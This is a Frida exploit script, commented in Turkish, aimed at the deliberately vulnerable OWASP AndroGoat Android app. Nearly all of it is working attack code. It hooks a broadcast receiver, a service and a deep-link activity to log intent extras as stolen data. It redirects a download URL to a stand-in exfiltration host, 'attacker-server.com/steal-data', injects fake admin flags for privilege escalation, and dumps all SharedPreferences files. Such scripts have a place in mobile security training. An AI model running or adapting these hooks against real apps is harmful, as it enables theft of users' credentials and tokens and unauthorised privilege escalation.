Java.perform(function() {
    console.log("[üéØ OWASP GOAT EXPLOIT STARTED]");
    
    // Context'i g√ºvenli ≈üekilde al
    var Application = Java.use("android.app.Application");
    var ActivityThread = Java.use("android.app.ActivityThread");
    var context = null;
    
    try {
        context = ActivityThread.currentApplication().getApplicationContext();
        console.log("[‚úÖ] Context obtained successfully");
    } catch (e) {
        console.log("[‚ùå] Context error: " + e);
        // Alternatif context alma y√∂ntemi
        try {
            context = Java.use("android.app.ActivityThread").currentApplication();
            console.log("[‚úÖ] Alternative context obtained");
        } catch (e2) {
            console.log("[‚ùå] Failed to get context: " + e2);
            return;
        }
    }
    
    // 1. SHOW DATA RECEIVER EXPLOITATION
    exploitShowDataReceiver();
    
    // 2. DOWNLOAD INVOICE SERVICE EXPLOITATION
    exploitDownloadInvoiceService();
    
    // 3. DEEP LINK ACTIVITY EXPLOITATION
    exploitDeepLinkActivity();
    
    // 4. SHARED PREFERENCES DATA THEFT - Context hazƒ±r olduƒüunda
    setTimeout(function() {
        stealSharedPreferences(context);
    }, 2000);
    
    // 5. OTOMATƒ∞K EXPLOIT TETƒ∞KLEYƒ∞Cƒ∞
    setTimeout(function() {
        console.log("[üöÄ AUTOMATIC EXPLOIT TRIGGER]");
        triggerExploits(context);
    }, 3000);
});

// 1. SHOW DATA RECEIVER S√ñM√úR√úS√ú
function exploitShowDataReceiver() {
    try {
        var ShowDataReceiver = Java.use("owasp.sat.agoat.ShowDataReceiver");
        
        ShowDataReceiver.onReceive.implementation = function(context, intent) {
            console.log("[üì° BROADCAST EXPLOIT] Receiver triggered!");
            
            // Intent bilgilerini logla
            var action = intent.getAction();
            console.log("[üîë ACTION] " + action);
            
            // T√ºm extras'larƒ± √ßal
            try {
                var extras = intent.getExtras();
                if (extras) {
                    var keys = extras.keySet().toArray();
                    for (var i = 0; i < keys.length; i++) {
                        var key = keys[i];
                        var value = extras.get(key);
                        console.log("[üíæ STOLEN EXTRA] " + key + " = " + value);
                    }
                }
            } catch (e) {
                console.log("[‚ùå EXTRAS ERROR] " + e);
            }
            
            // Zararlƒ± response g√∂nder
            sendMaliciousResponse(context);
            
            return this.onReceive(context, intent);
        };
        
        console.log("[‚úÖ] ShowDataReceiver hook ready!");
    } catch (e) {
        console.log("[‚ùå ShowDataReceiver hook failed] " + e);
    }
}

// 2. DOWNLOAD INVOICE SERVICE S√ñM√úR√úS√ú
function exploitDownloadInvoiceService() {
    try {
        var DownloadInvoiceService = Java.use("owasp.sat.agoat.DownloadInvoiceService");
        
        DownloadInvoiceService.onStartCommand.implementation = function(intent, flags, startId) {
            console.log("[‚ö° SERVICE EXPLOIT] DownloadInvoiceService started!");
            
            if (intent) {
                // URL'i deƒüi≈ütir
                try {
                    var originalUrl = intent.getStringExtra("url");
                    if (originalUrl) {
                        console.log("[üîó ORIGINAL URL] " + originalUrl);
                        intent.putExtra("url", "http://attacker-server.com/steal-data");
                        console.log("[‚ö†Ô∏è MALICIOUS URL] http://attacker-server.com/steal-data");
                    }
                } catch (e) {
                    console.log("[‚ùå URL MANIPULATION ERROR] " + e);
                }
                
                // Ek veriler √ßal
                stealServiceData(intent);
            }
            
            return this.onStartCommand(intent, flags, startId);
        };
        
        console.log("[‚úÖ] DownloadInvoiceService hook ready!");
    } catch (e) {
        console.log("[‚ùå DownloadInvoiceService hook failed] " + e);
    }
}

// 3. DEEP LINK ACTIVITY S√ñM√úR√úS√ú
function exploitDeepLinkActivity() {
    try {
        var AccessControl1ViewActivity = Java.use("owasp.sat.agoat.AccessControl1ViewActivity");
        
        AccessControl1ViewActivity.onCreate.implementation = function(savedInstanceState) {
            console.log("[üîó DEEP LINK EXPLOIT] Activity created via deep link!");
            
            try {
                var intent = this.getIntent();
                if (intent) {
                    var data = intent.getData();
                    if (data) {
                        console.log("[üåê DEEP LINK] " + data.toString());
                        
                        // Admin yetkilerini zorla
                        intent.putExtra("is_admin", true);
                        intent.putExtra("admin_token", "hacked_by_frida_123");
                        intent.putExtra("user_role", "super_admin");
                        console.log("[üé≠ PRIVILEGE ESCALATION] Admin rights injected!");
                    }
                }
            } catch (e) {
                console.log("[‚ùå DEEP LINK ERROR] " + e);
            }
            
            return this.onCreate(savedInstanceState);
        };
        
        console.log("[‚úÖ] Deep Link Activity hook ready!");
    } catch (e) {
        console.log("[‚ùå Deep Link hook failed] " + e);
    }
}

// 4. SHARED PREFERENCES VERƒ∞ HIRSIZLIƒûI
function stealSharedPreferences(context) {
    if (!context) {
        console.log("[‚ùå] No context for SharedPreferences theft");
        return;
    }
    
    try {
        var Context = Java.use("android.content.Context");
        var File = Java.use("java.io.File");
        
        // Uygulama dizinini bul
        var dataDir = context.getApplicationInfo().dataDir;
        var prefsDir = File.$new(dataDir, "shared_prefs");
        
        if (prefsDir.exists()) {
            var files = prefsDir.listFiles();
            console.log("[üìÅ] Found " + files.length + " preference files");
            
            for (var i = 0; i < files.length; i++) {
                var file = files[i];
                if (file.getName().endsWith(".xml")) {
                    try {
                        var prefsName = file.getName().replace(".xml", "");
                        var prefs = context.getSharedPreferences(prefsName, Context.MODE_PRIVATE.value);
                        var allData = prefs.getAll();
                        
                        console.log("[üîì PREF DATA] " + prefsName + ": " + JSON.stringify(allData));
                    } catch (e) {
                        console.log("[‚ùå PREF READ ERROR] " + file.getName() + ": " + e);
                    }
                }
            }
        } else {
            console.log("[‚ùå] No shared_prefs directory found");
        }
    } catch (e) {
        console.log("[‚ùå SHARED PREFS ERROR] " + e);
    }
}

// YARDIMCI FONKSƒ∞YONLAR
function sendMaliciousResponse(context) {
    try {
        var Intent = Java.use("android.content.Intent");
        var maliciousIntent = Intent.$new("owasp.sat.agoat.MALICIOUS_RESPONSE");
        maliciousIntent.putExtra("status", "hacked");
        maliciousIntent.putExtra("data", "stolen_via_frida");
        
        context.sendBroadcast(maliciousIntent);
        console.log("[‚ö° MALICIOUS BROADCAST SENT]");
    } catch (e) {
        console.log("[‚ùå BROADCAST ERROR] " + e);
    }
}

function stealServiceData(intent) {
    try {
        var extras = intent.getExtras();
        if (extras) {
            var keySet = extras.keySet();
            var iterator = keySet.iterator();
            
            console.log("[üîç SERVICE EXTRAS FOUND]:");
            
            while (iterator.hasNext()) {
                var key = iterator.next();
                var value = extras.get(key);
                console.log("   " + key + " = " + value);
                
                // Hassas verileri yakala
                if (key && value && 
                    (key.toLowerCase().includes("pass") || 
                     key.toLowerCase().includes("token") || 
                     key.toLowerCase().includes("key"))) {
                    console.log("[üî• SENSITIVE DATA] " + key + ": " + value);
                }
            }
        }
    } catch (e) {
        console.log("[‚ùå SERVICE DATA ERROR] " + e);
    }
}

function triggerExploits(context) {
    if (!context) {
        console.log("[‚ùå] No context for triggering exploits");
        return;
    }
    
    try {
        var Intent = Java.use("android.content.Intent");
        
        // Service'i tetikle
        var serviceIntent = Intent.$new();
        serviceIntent.setClassName("owasp.sat.agoat", "owasp.sat.agoat.DownloadInvoiceService");
        serviceIntent.putExtra("url", "http://legitimate.com/invoice");
        serviceIntent.putExtra("user_id", "victim_user");
        serviceIntent.putExtra("api_key", "secret_key_123");
        
        context.startService(serviceIntent);
        console.log("[‚ö° SERVICE EXPLOIT TRIGGERED]");
        
        // Broadcast g√∂nder
        var broadcastIntent = Intent.$new("android.intent.action.VIEW");
        broadcastIntent.setClassName("owasp.sat.agoat", "owasp.sat.agoat.ShowDataReceiver");
        broadcastIntent.putExtra("command", "get_sensitive_data");
        broadcastIntent.putExtra("target", "user_credentials");
        
        context.sendBroadcast(broadcastIntent);
        console.log("[üì° BROADCAST EXPLOIT TRIGGERED]");
        
    } catch (e) {
        console.log("[‚ùå TRIGGER ERROR] " + e);
    }
}

console.log("[üéØ OWASP GOAT EXPLOIT LOADED]");